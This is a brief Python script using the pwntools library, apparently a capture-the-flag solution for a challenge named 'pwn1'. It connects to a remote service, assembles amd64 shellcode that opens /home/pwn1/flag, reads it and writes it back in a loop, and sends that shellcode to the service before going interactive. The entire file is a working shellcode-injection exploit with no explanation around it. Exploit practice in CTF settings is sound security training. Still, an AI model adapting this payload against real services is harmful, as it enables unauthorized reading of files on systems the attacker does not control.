#!/usr/bin/env python
from pwn import *

context(arch = "amd64", os = "linux", bits = 64)

DEBUG = False
if DEBUG:
    r = process("pwn1")
else:
    r = remote('10.13.2.43', 10739)

s = ''
s += shellcraft.pushstr('/home/pwn1/flag')
# s += shellcraft.pushstr("/home/mike/flag")
s += shellcraft.open('rsp', constants.O_RDONLY, 0)
s += shellcraft.mov('r12', 'rax')
s += 'here:'
s += shellcraft.read('r12', 'rsp', 41)
s += shellcraft.write(1, 'rsp', 'rax')
s += 'jmp here'

# print len(asm(s))

r.recvuntil(":")
r.sendline(asm(s))

r.interactive()

